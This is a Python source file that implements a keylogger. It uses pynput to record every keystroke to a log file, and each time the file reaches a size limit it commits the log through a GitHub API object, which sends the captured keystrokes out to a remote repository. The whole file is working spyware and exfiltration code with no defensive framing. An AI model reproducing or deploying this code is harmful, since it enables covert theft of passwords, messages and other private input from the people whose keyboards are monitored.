import threading
import time
from pynput import keyboard


class Keylogger:
    def __init__(self, config):
        self.config = config

    def start(self, github_api):
        thread = threading.Thread(target=self._log_keystrokes(github_api))
        thread.start()

    def _reset_log_file(self, file):
        file.seek(0)
        file.truncate()

    def _log_keystrokes(self, github_api):
        with open(self.config.log_file, "w", encoding='utf-8') as keystroke_file:
            # Callback function for handling keyboard events
            def _on_press(key):
                # Check if file size has exceeded limit
                if keystroke_file.tell() >= self.config.log_size_limit:
                    keystroke_file.flush()
                    print(f"File size is {keystroke_file.tell()}")
                    github_api.commit_changes(self.config.log_file, "custom message")
                    self._reset_log_file(keystroke_file)
                try:
                    keystroke_file.write(key.char)
                except AttributeError:
                    keystroke_file.write(f'\nSpecial key {key} pressed\n')
                keystroke_file.flush()
            with keyboard.Listener(on_press=_on_press) as listener:
                listener.join()
